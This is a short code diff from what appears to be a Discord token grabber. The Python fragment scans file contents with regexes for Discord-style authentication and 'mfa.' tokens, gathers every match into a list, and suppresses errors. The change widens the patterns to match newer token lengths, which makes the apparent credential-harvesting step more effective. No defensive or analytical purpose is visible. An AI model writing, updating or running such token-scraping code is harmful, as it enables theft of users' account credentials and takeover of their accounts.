@@ -15,7 +15,7 @@ try:
 
         with open(file_path, 'r', errors='ignore') as file:
             for line in [x.strip() for x in file.readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                     for token in re.findall(regex, line):
                         tokens.append(token)
 except Exception:
